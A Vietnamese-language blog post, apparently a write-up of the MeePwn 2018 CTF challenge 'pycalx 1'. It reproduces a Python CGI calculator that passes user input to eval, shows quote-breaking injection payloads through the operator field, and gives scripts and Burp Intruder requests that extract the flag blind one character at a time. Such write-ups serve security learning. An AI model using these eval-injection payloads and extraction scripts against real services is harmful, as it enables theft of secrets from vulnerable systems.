---
title: "Meepwn qual round - pycalx 1"
date: 2018-09-11T02:38:33+07:00
author: "Kev"
tags: ["ctf", "python"]
comments: true
draft: false
---

Thử thách cung cấp cho mình 1 form dữ liệu cùng với sourcecode như sau:

{{<highlight python3>}}
#!/usr/bin/env python
import cgi;
import sys
from html import escape

FLAG = open('/var/www/flag','r').read()

OK_200 = """Content-type: text/html

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
<center>
<title>PyCalx</title>
<h1>PyCalx</h1>
<form>
<input class="form-control col-md-4" type=text name=value1 placeholder='Value 1 (Example: 1  abc)' autofocus/>
<input class="form-control col-md-4" type=text name=op placeholder='Operator (Example: + - * ** / // == != )' />
<input class="form-control col-md-4" type=text name=value2 placeholder='Value 2 (Example: 1  abc)' />
<input class="form-control col-md-4 btn btn-success" type=submit value=EVAL />
</form>
<a href='?source=1'>Source</a>
</center>
"""

print(OK_200)
arguments = cgi.FieldStorage()

if 'source' in arguments:
    source = arguments['source'].value
else:
    source = 0

if source == '1':
    print('<pre>'+escape(str(open(__file__,'r').read()))+'</pre>')

if 'value1' in arguments and 'value2' in arguments and 'op' in arguments:

    def get_value(val):
        val = str(val)[:64]
        if str(val).isdigit(): return int(val)
        blacklist = ['(',')','[',']','\'','"'] # I don't like tuple, list and dict.
        if val == '' or [c for c in blacklist if c in val] != []:
            print('<center>Invalid value</center>')
            sys.exit(0)
        return val

    def get_op(val):
        val = str(val)[:2]
        list_ops = ['+','-','/','*','=','!']
        if val == '' or val[0] not in list_ops:
            print('<center>Invalid op</center>')
            sys.exit(0)
        return val

    op = get_op(arguments['op'].value)
    value1 = get_value(arguments['value1'].value)
    value2 = get_value(arguments['value2'].value)

    if str(value1).isdigit() ^ str(value2).isdigit():
        print('<center>Types of the values don\'t match</center>')
        sys.exit(0)

    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))

    print('<div class=container><div class=row><div class=col-md-2></div><div class="col-md-8"><pre>')
    print('>>>> print('+escape(calc_eval)+')')

    try:
        result = str(eval(calc_eval))
        if result.isdigit() or result == 'True' or result == 'False':
            print(result)
        else:
            print("Invalid") # Sorry we don't support output as a string due to security issue.
    except:
        print("Invalid")


    print('>>> </pre></div></div></div>')
{{</highlight>}}

Server nhận dữ liệu ở 3 biến: `value1`, `value2` và `op`. Cả 3 biến đều bị filter, chức năng là thực hiện phép tính nhập từ người dùng.

{{<highlight python>}}
>>>> print('aa'+'bbb')
Invalid
>>>
>>>> print(1111*222)
246642
{{</highlight>}}

Mục đích rất rõ ràng, phải tìm cách để gọi biến Flag ra, nhưng xem code ở dòng này thì chương trình đã chặn output (tức là dạng blind).

{{<highlight python>}}
if result.isdigit() or result == 'True' or result == 'False':
    print(result)
else:
    print("Invalid")
{{</highlight>}}

Khi rà soát lại code, mình phát hiện code có 1 điểm hơi lạ, ở function `get_op(val)` nhận độ dài biến val tận 2 kí tự nhưng chỉ filter đúng kí tự đầu, nên mình nghĩ ra cách để break dấu `'` chèn biến `FLAG` vào, đồng thời thực hiện so sánh để nhận giá trị `True`, `False`.

{{<highlight python>}}
>>>> print('a'+''<FLAG#')
False
{{</highlight>}}

Có vẻ đi đúng hướng, được biết trước là flag có dạng `MeePwnCTF{}` tiếp theo mình test thế này:

{{<highlight python>}}
>>>> print('L'+''>FLAG#')
False
>>>
>>>> print('M'+''>FLAG#')
False
>>>
>>>> print('N'+''>FLAG#')
True
{{</highlight>}}

Test theo bảng chữ `printable` từ đầu đến khi gặp response trả về là `True` và lấy kí tự trước đó:

{{<highlight python3>}}
# python 3.6
import requests
import string
import sys
from urllib.parse import quote_plus
url = "http://178.128.96.203/cgi-bin/server.py?value1={}&op=%2B%27&value2=%3EFLAG%23"
wordlist = list(string.printable[:-6])
wordlist.sort()
temp = "_"
flag = "MeePwnCTF{"
while True:
	for char in wordlist:
		sys.stdout.write(temp)
		sys.stdout.flush()
		r = requests.get(url.format(quote_plus(flag+char)))
		if ("True" in r.text):
			flag += temp
			break
		temp = char
		sys.stdout.write("\b")
{{</highlight>}}

Flag chạy tới đoạn `MeePwnCTF{python3.66666666666666_` thì bị lỗi. Có anh trong team bảo là do trong flag có kí tự bị chặn `[]()'"` nên không chạy tiếp được nữa. Lúc này mình tưởng ra flag rồi, ai ngờ …..đành tính cách khác. Suy nghĩ hơi lâu không tìm ra được cách nào để gửi lên kí tự bị chặn đấy nhưng mình có kế tạm thời là đoán tất cả những kí tự không bị chặn nhưng chưa tìm ra, ví dụ `MeePwnCTF{python3.66666666666666_*[][][][][]*xxxxxxxxx}` mình có thể tìm được kí tự xxxx đó mà không cần biết kí tự đặc biệt. Payload mình build như sau:

{{<highlight python>}}
>>>> print('Mee'+'' in FLAG#')
True
>>>
>>>> print('}'+'' in FLAG#')
True
{{</highlight>}}

Sourcecode trước không dùng được nữa nên mình dùng burp suite intruder thay thế (mất thời gian quá {{<emoji ah>}})

```
GET /cgi-bin/server.py?value1=§_§&op=%2B%27&value2=%20in%20FLAG%23 HTTP/1.1  => Tìm tất cả kí tự có trong FLAG
```

{{<figure src="/images/posts/meepwn.png" width="100%" title="Burpsuite intruder">}}

Tiếp đó, mình sẽ đoán cụm từ trong flag

```
GET /cgi-bin/server.py?value1=§_§a&op=%2B%27&value2=%20in%20FLAG%23 HTTP/1.1  => Tìm kí tự đứng trước a
GET /cgi-bin/server.py?value1=a§_§&op=%2B%27&value2=%20in%20FLAG%23 HTTP/1.1  => Tìm kí tự đứng sau a
```

Cứ như thế đến hết danh sách kí tự tìm được thì mình tìm được 80% flag như là `MeePwnCTF{python3.66666666666666_*you_passed_this?*}` dấu * là kí tự đặc biệt. Sau khi làm xong bước này thì anh trong team quăng cho payload:

```
http://178.128.96.203/cgi-bin/server.py
?value1=M
&op=%2B%27
&value2= %2b source < FLAG%23
&source=e
>>>> print('M'+'' + source < FLAG#')
True
```

Vậy là xong, biến source không bị filter nên thoải mái mà inject. Payload cuối cùng là thế này:

{{<highlight python3>}}
# Python 3.6
import requests
import string
import sys
from urllib.parse import quote_plus
# url = "http://178.128.96.203/cgi-bin/server.py?value1={}&op=%2B%27&value2=%3EFLAG%23"
url = "http://178.128.96.203/cgi-bin/server.py?value1=MeePwnCTF%7bpython3.66666666666666_&op=%2B%27&value2=%20%2b%20source%20%3E%20FLAG%23&source={}"
wordlist = list(string.printable[:-6])
wordlist.sort()
temp = "_"
flag = ""
sys.stdout.write("MeePwnCTF{python3.66666666666666_")
while True:
	for char in wordlist:
		sys.stdout.write(temp)
		sys.stdout.flush()
		r = requests.get(url.format(quote_plus(flag+char)))
		if ("True" in r.text):
			flag += temp
			break
		temp = char
		sys.stdout.write("\b")
{{</highlight>}}


FLAG: `MeePwnCTF{python3.66666666666666_([_((you_passed_this?]]]]]])}`